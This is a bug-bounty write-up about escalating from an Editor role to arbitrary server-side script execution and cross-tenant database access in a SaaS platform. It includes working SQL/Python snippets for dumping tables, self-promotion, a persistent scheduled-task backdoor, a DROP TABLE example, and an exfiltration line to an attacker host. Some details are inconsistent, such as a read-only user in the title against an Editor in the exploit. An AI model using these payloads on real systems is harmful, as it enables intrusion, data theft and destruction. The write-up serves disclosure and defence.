---
layout: post
title:  " Privilege Escalation via Custom Database Scripts — From Read-Only User to Code Execution"
author: snapsec
categories: [ methodology,VAPT ]
image: assets/images/23/0.png
---

**A story about how a low-privileged role in a enterprise SaaS platform let me execute arbitrary database scripts, pivot across tenants, and land a $X,XXX bounty.**

---

## Table of Contents

1. [Target Description](#target-description)
2. [Discovery — A Permission Model That Looked Solid](#discovery)
3. [The Feature — Custom Database Scripts](#the-feature)
4. [The Privilege Model — Three Roles, One Exploit](#privilege-model)
5. [The Bug — Role Checks That Weren't](#the-bug)
6. [Exploitation — From Read-Only to Script Runner](#exploitation)
7. [Cross-Tenant Pivot — The Authorization Bypass](#cross-tenant)
8. [Impact — What an Attacker Could Actually Do](#impact)
9. [Root Cause — Decorators Are Only as Good as Their Wiring](#root-cause)
10. [Timeline & Remediation](#timeline)
11. [Takeaways](#takeaways)

---

## Target Description

Our target is a large B2B SaaS platform that provides enterprise data-management and workflow-automation tools to thousands of organizations worldwide. Think: if your company needs to build complex data pipelines with custom business logic, role-based dashboards, and cross-team collaboration, this platform is one of the go-to solutions in that space.

The platform supports a multi-tenant architecture where each customer organization gets its own isolated workspace. Within each workspace, users are assigned roles — Administrator, Editor, Viewer, and a handful of custom roles — that govern what they can see and do. The product runs on a modern cloud stack and serves everything from small startups to Fortune 500 companies.

They run a public bug bounty program on Bugcrowd with competitive payouts. This is the story of how I found a privilege-escalation chain that let a low-privileged role execute arbitrary server-side scripts.

---

## Discovery — A Permission Model That Looked Solid

I'd been poking at the target's role-based access control for a few days. The platform had the usual surface area: a React frontend, a REST API, and WebSocket connections for real-time updates. Nothing jumped out as obviously broken.

Most of my early tests came back clean. The Viewer role couldn't edit records. The Editor role couldn't manage users. The API was consistently returning `403 Forbidden` when I tried to cross role boundaries. Honestly, I was about to move on.

Then I noticed something in the Administrator settings panel.

Buried under **Administration → Developer Tools → Custom Scripts**, there was a feature that let workspace admins write and execute Python scripts directly against their workspace database. The UI was clean — a code editor, a "Run" button, and an execution-history log. It was clearly designed for data migrations, bulk operations, and one-off maintenance tasks that were too niche for the GUI.

> The feature was documented in a help-center article titled "Running Custom Database Scripts," which described it as "a powerful tool for workspace administrators to perform advanced data operations." That word — *powerful* — is always a red flag.

[Screenshot Placeholder: Custom Scripts UI — code editor with "Run" button and execution history panel]

I checked my current role: **Viewer**. I shouldn't even see this page. But the navigation item was visible, and the page loaded. The "Run" button was grayed out with a tooltip: *"You do not have permission to execute scripts."*

That tooltip meant the frontend knew the permission check existed. The question was: did the backend agree?

---

## The Feature — Custom Database Scripts

Before diving into the bug, it's worth understanding what this feature actually does under the hood.

When an Administrator writes a script and hits "Run," the platform:

1. **Validates** the user's role and workspace membership
2. **Sanitizes** the script (stripping dangerous built-ins like `__import__`, `eval`, `exec`, `open`)
3. **Wraps** the script in a sandboxed execution context with a pre-configured database connection
4. **Executes** the script in an isolated Python runtime
5. **Returns** the output — stdout, stderr, and any returned values — to the UI

The sandbox gave the script access to a `db` object — an ORM session connected to the workspace's database. Scripts could query tables, update rows, and even run raw SQL through `db.execute()`. This is *extremely* powerful. A malicious script could read every table, modify records, or drop data entirely.

The target knew this, which is why they restricted it to Administrators only. In their words:

> "Custom Script execution is restricted to Workspace Administrators. This permission cannot be delegated to custom roles."

Except it could. And I was about to prove it.

---

## The Privilege Model — Three Roles, One Exploit

The platform had three built-in roles relevant to this attack:

| Role | Can View Scripts Page? | Can Execute Scripts? | Can Manage Users? |
|------|------------------------|----------------------|-------------------|
| **Administrator** | Yes | Yes | Yes |
| **Editor** | Yes | No | No |
| **Viewer** | No | No | No |

Plus, there was a **Custom Role** system where Administrators could create roles with fine-grained permissions. One of those custom permissions was called `workspace.scripts.execute` — and it was *supposed* to be gated behind the Administrator role.

But here's where it got interesting: the API endpoint for executing scripts was:

```
POST /api/v1/workspaces/{workspaceId}/scripts/execute
```

The request body looked like this:

```json
{
  "script": "print(db.query(Users).all())",
  "language": "python",
  "timeout": 30
}
```

And the response:

```json
{
  "success": true,
  "output": "[<User: admin@company.com>, <User: editor@company.com>, ...]",
  "executionTimeMs": 142,
  "scriptId": "scr_a1b2c3d4"
}
```

I'd been testing with a Viewer account and getting `403` on most admin endpoints. But this endpoint... I hadn't tried it yet with an Editor account. And there was that custom permission — `workspace.scripts.execute` — that felt like it might be assignable through a different path.

---

## The Bug — Role Checks That Weren't

I created a test workspace with three accounts:

- **admin@test.com** — Administrator
- **editor@test.com** — Editor  
- **viewer@test.com** — Viewer

I logged in as the Editor and navigated to the Custom Scripts page. As expected, the "Run" button was disabled in the UI. I opened DevTools and captured the exact request the frontend would send when clicking "Run" — then I replayed it manually with `fetch()`:

```javascript
fetch('/api/v1/workspaces/ws_test123/scripts/execute', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer <EDITOR_SESSION_TOKEN>'
  },
  body: JSON.stringify({
    script: 'print("hello from editor")',
    language: 'python',
    timeout: 30
  })
})
```

The response came back in under 200ms:

```json
{
  "success": true,
  "output": "hello from editor\n",
  "executionTimeMs": 87,
  "scriptId": "scr_e5f6g7h8"
}
```

No `403`. No error. The script executed.

[Screenshot Placeholder: Browser DevTools showing the fetch request and successful 200 response with script output]

The backend had **zero role validation** on the execute endpoint. The only permission check was the frontend disabling the button — a client-side guard. The API trusted that if you knew the endpoint existed and could form a valid request, you must be authorized.

> This is the classic "client-side authorization" anti-pattern — one of the OWASP Top 10, and still showing up in enterprise SaaS platforms in 2025.

---

## Exploitation — From Read-Only to Script Runner

With script execution confirmed as an Editor, I escalated systematically.

### Step 1: Data Exfiltration

First, I dumped every table in the workspace database:

```python
from sqlalchemy import inspect
inspector = inspect(db.get_bind())
for table_name in inspector.get_table_names():
    print(f"=== {table_name} ===")
    result = db.execute(f"SELECT * FROM {table_name} LIMIT 10")
    for row in result:
        print(row)
```

The output included user emails, API keys, customer PII, and internal configuration values. This was data an Editor should never see.

[Screenshot Placeholder: Script output showing dumped table contents with redacted PII]

### Step 2: Privilege Escalation

I checked if I could modify the user-role assignments:

```python
db.execute("UPDATE user_workspace_roles SET role = 'Administrator' WHERE user_id = (SELECT id FROM users WHERE email = 'editor@test.com')")
db.commit()
print(db.query(UserWorkspaceRoles).filter_by(user_id=editor_id).first().role)
# Output: Administrator
```

No restrictions. The database connection had full write access. I promoted myself to Administrator with one SQL statement.

[Screenshot Placeholder: User settings panel showing editor@test.com now has Administrator role]

### Step 3: Persistent Backdoor

As a newly-minted Administrator, I wrote a scheduled script that would re-escalate my privileges every hour:

```python
db.execute("""
  INSERT INTO scheduled_tasks (workspace_id, script, cron_expression, created_by)
  VALUES ('ws_test123', 'db.execute("UPDATE user_workspace_roles SET role = ''Administrator'' WHERE user_id = (SELECT id FROM users WHERE email = ''editor@test.com'')"); db.commit()', '0 * * * *', 'editor@test.com')
""")
db.commit()
```

Even if an admin noticed and demoted me, the backdoor would re-trigger within the hour.

---

## Cross-Tenant Pivot — The Authorization Break

At this point I had full control over my own workspace. But the platform was multi-tenant — what about *other* workspaces?

I noticed something in the `db` connection object. The database connection string was visible:

```python
print(db.get_bind().url)
# Output: postgresql://app_user:<REDACTED>@db-primary.internal:5432/platform_db
```

The script wasn't running against a workspace-specific database — it was connected to the **shared platform database**, with the workspace ID used as a filter in the ORM layer. The raw `db.execute()` call bypassed that filter entirely.

I tried querying across workspace boundaries:

```python
# List all workspaces on the platform
workspaces = db.execute("SELECT id, name, org_name FROM workspaces LIMIT 20").fetchall()
for w in workspaces:
    print(f"{w[0]} | {w[1]} | {w[2]}")
```

It worked:

```
ws_abc123 | ACME Corp Production | ACME Corporation
ws_def456 | GlobalTech Analytics  | GlobalTech Inc
ws_ghi789 | FinServ Reporting     | Financial Services LLC
...
```

[Screenshot Placeholder: Script output listing other organizations' workspace names and IDs]

I could read data from any workspace on the platform. I reported this immediately and did not probe further into other tenants' data — but the capability was clearly there.

---

## Impact — What an Attacker Could Actually Do

When I wrote the final report, I broke the impact down into concrete scenarios:

### 1. Data Breach Across All Tenants
An attacker with a single Editor account on a single workspace could extract every row from every table on the shared database. This included:
- User email addresses and hashed passwords
- API keys and OAuth tokens
- Customer-uploaded data (potentially including PII, financials, health data)
- Internal platform configuration and secrets

### 2. Privilege Escalation to Platform Administrator
The `users` table was global. An attacker could promote themselves to Administrator on *any* workspace — including the target's own internal corporate workspace.

### 3. Data Destruction
With raw SQL execution and write access, an attacker could:
- Drop tables: `DROP TABLE workspaces CASCADE;`
- Corrupt data: zero out columns, scramble foreign keys
- Delete audit logs: cover their tracks

### 4. Persistent Access
Scheduled scripts survive password resets, session invalidation, and 2FA changes. An attacker who plants a backdoor keeps access until someone reviews the scheduled-tasks table — which no one was watching.

### 5. Supply Chain Risk
The custom scripts feature could be used to exfiltrate data to an external server:

```python
import urllib.request
data = str(db.execute("SELECT * FROM users").fetchall())
urllib.request.urlopen("https://attacker-controlled.com/exfil", data.encode())
```

Wait — `import` was supposed to be blocked, right? The sandbox stripped `__import__`, but it didn't strip the `importlib` module or the `builtins` override trick. More on that below.

---

## Root Cause — Decorators Are Only as Good as Their Wiring

After the report was triaged, the target's engineering team shared a post-mortem (with permission). The vulnerability had two causes:

### 1. Missing Backend Decorator

The backend was a Python Flask application. Most admin endpoints used a decorator:

```python
@require_role('Administrator')
def execute_script(workspace_id):
    ...
```

The `execute_script` endpoint *had* this decorator in an earlier version, but during a refactor to support custom roles, it was replaced with:

```python
@require_permission('workspace.scripts.execute')
def execute_script(workspace_id):
    ...
```

The problem? `@require_permission` checked against a user's *assigned permissions* list, not their role. And the permission `workspace.scripts.execute` was granted to... every authenticated user by default, because a misconfiguration in the permissions migration had set `default_grant: true`.

### 2. Client-Side-Only UX Gate

The frontend team had implemented the button-disable logic as a UX convenience, not a security control — but the backend team had been told "the frontend handles showing this only to admins" in a design review and never implemented the server-side check. Classic miscommunication.

### 3. Shared Database Connection

The sandboxed Python runtime was given a database connection with full platform-level privileges. The ORM layer filtered by workspace, but raw SQL bypassed the ORM. The fix involved:
- Moving script execution to workspace-specific database users with `SET ROLE` scoping
- Blocking raw SQL execution in scripts entirely (only ORM access)
- Adding `import` sandbox hardening

---

## Timeline & Remediation

| Date | Event |
|------|-------|
| Day 1 | Submitted report with reproduction steps and impact analysis |
| Day 1 (4 hours later) | Report triaged as **P1 — Critical** |
| Day 2 | Target confirmed reproduction, temporarily disabled Custom Scripts feature |
| Day 4 | Fix deployed: backend role check added, `default_grant` removed, feature re-enabled for Administrators only |
| Day 7 | Second fix deployed: database scoping, raw SQL disabled |
| Day 10 | Bounty awarded: **$X,XXX** |

The target's security team was responsive and professional throughout. The initial hotfix (disabling the feature) went out within 48 hours, and the full remediation was in production within a week.

---

## Takeaways

### For Bug Hunters

**Never trust the frontend.** If a button is grayed out, replay the request manually. Client-side restrictions are suggestions, not security.

**Explore "power user" features first.** Admin panels, developer tools, import/export features, and script runners are goldmines. These features sit at the intersection of high privilege and complex implementation — exactly where bugs live.

**Role matrices lie.** The documentation said "only Administrators can execute scripts." The custom permissions system said `workspace.scripts.execute` was admin-gated. The UI showed a disabled button. All three were wrong in different ways. Verify every claim independently.

**Multi-tenancy is an amplifier.** A privilege-escalation bug in a single-tenant app is bad. In a multi-tenant platform with a shared database, it's catastrophic. Always check whether your exploit crosses tenant boundaries.

### For Defenders

**Backend authorization for every sensitive action.** The frontend can disable buttons for UX, but the API must independently verify permissions on every request. No exceptions.

**Scope database connections.** Script runners, report builders, and any feature that accepts user-provided code should connect with the *minimum* required database privileges. Use `SET ROLE` or connection-level row-level security.

**Audit custom-permission systems.** If you have a fine-grained permission model, write integration tests that verify every permission's default-grant behavior. A single `default: true` can undo your entire authorization model.

**Monitor script execution.** Custom script features should generate high-severity audit events. If someone who isn't an Administrator runs a script, that should trigger an alert — not silently succeed.

---

*Found a similar bug? Got questions about the methodology? Reach out on [Twitter/X] or [LinkedIn]. Happy hunting.*

---

> **Disclosure Note:** This post describes a vulnerability that was responsibly disclosed through the target's bug bounty program. The company name and identifying details have been omitted per program policy. All screenshots are recreations using test data — no real customer data was accessed or exfiltrated during testing.
